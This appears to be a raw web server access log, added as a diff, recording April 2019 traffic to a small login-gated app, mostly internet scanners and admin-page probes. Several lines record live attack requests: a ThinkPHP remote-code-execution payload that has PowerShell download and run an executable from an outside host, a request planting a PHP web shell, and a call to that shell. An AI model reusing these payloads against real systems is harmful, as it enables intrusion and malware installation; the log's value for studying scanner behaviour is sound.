+welcome: Unable to identify user...redirecting to login
+::ffff:58.18.172.106 - - [12/Apr/2019:09:24:54 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 zgrab/0.x"
+::ffff:58.18.172.106 - - [12/Apr/2019:09:24:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 zgrab/0.x"
+welcome: Unable to identify user...redirecting to login
+::ffff:198.108.66.128 - - [12/Apr/2019:11:51:51 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 zgrab/0.x"
+::ffff:198.108.66.128 - - [12/Apr/2019:11:51:51 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 zgrab/0.x"
+welcome: Unable to identify user...redirecting to login
+::ffff:61.219.11.153 - - [12/Apr/2019:19:03:48 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:106.75.65.85 - - [12/Apr/2019:19:54:54 +0000] "GET / HTTP/1.0" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:106.75.85.117 - - [12/Apr/2019:19:54:55 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+::ffff:106.75.85.117 - - [12/Apr/2019:19:54:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.97.122 - - [12/Apr/2019:22:32:40 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+welcome: Unable to identify user...redirecting to login
+::ffff:184.105.247.194 - - [13/Apr/2019:00:04:34 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:27.50.162.222 - - [13/Apr/2019:01:36:40 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+redirecting to login
+::ffff:5.188.210.101 - - [13/Apr/2019:06:24:51 +0000] "GET http://5.188.210.101/echo.php HTTP/1.1" 302 28 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:06:31:50 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:06:31:50 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:06:31:55 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:06:31:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:07:16:00 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:07:16:00 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:07:16:17 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:07:16:17 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:08:00:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:08:00:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:08:00:37 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:08:00:37 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:27.50.162.222 - - [13/Apr/2019:08:39:01 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:08:44:17 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:08:44:17 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:66.240.205.34 - - [13/Apr/2019:08:44:31 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+::ffff:66.240.205.34 - - [13/Apr/2019:08:44:31 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+redirecting to login
+::ffff:66.240.205.34 - - [13/Apr/2019:08:44:31 +0000] "GET /robots.txt HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:66.240.205.34 - - [13/Apr/2019:08:44:31 +0000] "GET /sitemap.xml HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:66.240.205.34 - - [13/Apr/2019:08:44:32 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:08:44:59 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:08:44:59 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:09:28:26 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:09:28:26 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:09:29:19 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:09:29:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:128.199.88.117 - - [13/Apr/2019:09:47:50 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 zgrab/0.x"
+::ffff:128.199.88.117 - - [13/Apr/2019:09:47:51 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 zgrab/0.x"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:10:12:35 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:10:12:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:10:13:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:10:13:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:10:56:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:10:56:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:10:58:01 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:10:58:01 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:11:40:52 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:11:40:52 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:11:42:19 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:11:42:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:12:25:01 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:12:25:01 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:12:26:41 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:12:26:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:13:09:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:13:09:10 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:13:11:02 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:13:11:02 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [13/Apr/2019:13:55:30 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [13/Apr/2019:13:55:30 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [13/Apr/2019:14:39:44 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [13/Apr/2019:14:39:44 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+- - - [13/Apr/2019:15:08:55 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [13/Apr/2019:15:11:35 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [13/Apr/2019:15:11:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [13/Apr/2019:15:11:39 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [13/Apr/2019:15:11:39 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [13/Apr/2019:15:23:48 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [13/Apr/2019:15:23:48 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:103.197.25.48 - - [13/Apr/2019:15:31:37 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/3.0 (compatible; Indy Library)"
+::ffff:103.197.25.48 - - [13/Apr/2019:15:31:38 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/3.0 (compatible; Indy Library)"
+redirecting to login
+::ffff:27.50.162.222 - - [13/Apr/2019:18:55:09 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+redirecting to login
+::ffff:160.124.155.144 - - [13/Apr/2019:20:48:53 +0000] "GET /manager/html HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:160.124.155.144 - - [13/Apr/2019:20:48:54 +0000] "GET /shell?uname%20-a HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:60.191.38.77 - - [13/Apr/2019:21:25:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
+::ffff:60.191.38.77 - - [13/Apr/2019:21:25:58 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.96.178 - - [13/Apr/2019:22:50:16 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+redirecting to login
+::ffff:187.84.215.226 - admin [13/Apr/2019:23:33:10 +0000] "GET /manager/html HTTP/1.1" 302 28 "-" "-"
+::ffff:187.84.215.226 - admin [13/Apr/2019:23:33:10 +0000] "GET /login HTTP/1.1" 200 7268 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:216.218.206.68 - - [14/Apr/2019:00:34:35 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [14/Apr/2019:11:31:35 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [14/Apr/2019:11:31:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [14/Apr/2019:11:31:36 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [14/Apr/2019:11:31:36 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:103.90.203.138 - - [14/Apr/2019:11:51:43 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+welcome: Unable to identify user...redirecting to login
+::ffff:194.61.24.169 - - [14/Apr/2019:19:08:28 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+::ffff:194.61.24.169 - - [14/Apr/2019:19:08:28 +0000] "GET /login HTTP/1.1" 200 7268 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.97.114 - - [14/Apr/2019:21:59:04 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+welcome: Unable to identify user...redirecting to login
+::ffff:216.218.206.67 - - [15/Apr/2019:00:11:41 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:23.225.147.66 - - [15/Apr/2019:01:15:34 +0000] "GET / HTTP/1.1" 302 28 "-" "python-requests/2.21.0"
+::ffff:23.225.147.66 - - [15/Apr/2019:01:15:34 +0000] "GET /login HTTP/1.1" 200 7268 "-" "python-requests/2.21.0"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [15/Apr/2019:03:45:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [15/Apr/2019:03:45:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [15/Apr/2019:03:45:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [15/Apr/2019:03:45:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:139.162.79.87 - - [15/Apr/2019:04:33:31 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0"
+redirecting to login
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:39 +0000] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start%20C:/Windows/temp/dijigecapqbndom10983.exe HTTP/1.1" 302 28 "http://3.16.183.224:8080/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start C:/Windows/temp/dijigecapqbndom10983.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:39 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start C:/Windows/temp/dijigecapqbndom10983.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+redirecting to login
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:40 +0000] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php HTTP/1.1" 302 28 "http://3.16.183.224:8080/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+redirecting to login
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:40 +0000] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start%20C:/Windows/temp/dijigecapqbndom10983.exe HTTP/1.1" 302 28 "http://3.16.183.224:8080/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start C:/Windows/temp/dijigecapqbndom10983.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+::ffff:131.72.141.222 - - [15/Apr/2019:07:17:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/dijigecapqbndom10983.exe');start C:/Windows/temp/dijigecapqbndom10983.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.96.106 - - [15/Apr/2019:16:35:44 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+welcome: Unable to identify user...redirecting to login
+::ffff:71.6.232.4 - - [15/Apr/2019:17:27:02 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
+redirecting to login
+::ffff:120.79.30.191 - - [15/Apr/2019:18:21:04 +0000] "GET /TP/public/index.php HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:120.79.30.191 - - [15/Apr/2019:18:21:06 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/TP/public/index.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:120.79.30.191 - - [15/Apr/2019:18:21:06 +0000] "GET /TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:120.79.30.191 - - [15/Apr/2019:18:21:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:120.79.30.191 - - [15/Apr/2019:18:21:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:45.33.13.96 - - [15/Apr/2019:20:51:50 +0000] "GET /admin/connection/ HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+::ffff:45.33.13.96 - - [15/Apr/2019:20:51:51 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/admin/connection/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:185.176.27.114 - - [16/Apr/2019:00:02:13 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:184.105.247.196 - - [16/Apr/2019:00:16:29 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+redirecting to login
+::ffff:103.240.126.19 - - [16/Apr/2019:09:26:03 +0000] "GET /TP/public/index.php HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:103.240.126.19 - - [16/Apr/2019:09:26:09 +0000] "POST /users?page=&size=5 HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:196.52.43.108 - - [16/Apr/2019:09:44:43 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
+redirecting to login
+::ffff:115.215.219.231 - - [16/Apr/2019:14:29:48 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+redirecting to login
+::ffff:115.215.219.231 - - [16/Apr/2019:14:45:24 +0000] "GET /manager/html HTTP/1.1" 302 56 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.96.162 - - [16/Apr/2019:19:44:26 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+::ffff:128.148.231.11 - - [16/Apr/2019:21:34:18 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
+::ffff:128.148.231.11 - - [16/Apr/2019:21:34:20 +0000] "GET /signup HTTP/1.1" 200 4856 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
+user did not validate
+::ffff:128.148.231.11 - - [16/Apr/2019:21:34:22 +0000] "POST /signup HTTP/1.1" 200 4874 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/signup" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:216.218.206.69 - - [17/Apr/2019:00:02:35 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+::ffff:192.91.235.243 - - [17/Apr/2019:01:19:03 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
+redirecting to login
+::ffff:192.91.235.243 - - [17/Apr/2019:01:19:03 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
+::ffff:192.91.235.243 - - [17/Apr/2019:01:19:04 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
+redirecting to login
+::ffff:192.91.235.243 - - [17/Apr/2019:01:19:04 +0000] "GET /apple-touch-icon.png HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
+::ffff:192.91.235.243 - - [17/Apr/2019:01:19:04 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
+::ffff:138.16.125.251 - - [17/Apr/2019:01:19:20 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+DATABASE: SELECT * FROM User U WHERE U.userName = 'jennifer'
+DATABASE RETURN 0
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:23 +0000] "POST /login HTTP/1.1" 200 7574 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [17/Apr/2019:01:20:29 +0000] "GET /signup HTTP/1.1" 200 4856 "http://ec2-3-16-183-224.us-east-2.compute.amazonaws.com:8080/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
